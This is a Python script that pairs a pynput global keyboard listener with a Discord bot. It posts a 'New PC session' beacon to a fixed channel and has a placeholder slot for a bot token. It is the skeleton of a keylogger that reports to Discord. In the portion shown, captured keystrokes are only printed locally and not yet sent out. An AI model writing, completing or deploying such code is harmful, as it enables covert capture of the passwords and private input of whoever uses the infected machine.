import discord
from pynput.keyboard import Key, Listener

client = discord.Client()
bot_token = ''   # Paste here BOT-token

channel_ids = {
    'main': 831567586344697868   # Paste here main channel ID
}

@client.event 
async def on_ready():  
    await client.get_channel(channel_ids['main']).send('New PC session')

def on_press(key):
    print(key)

with Listener(on_press=on_press) as listener:
    client.run(bot_token)
    listener.join()
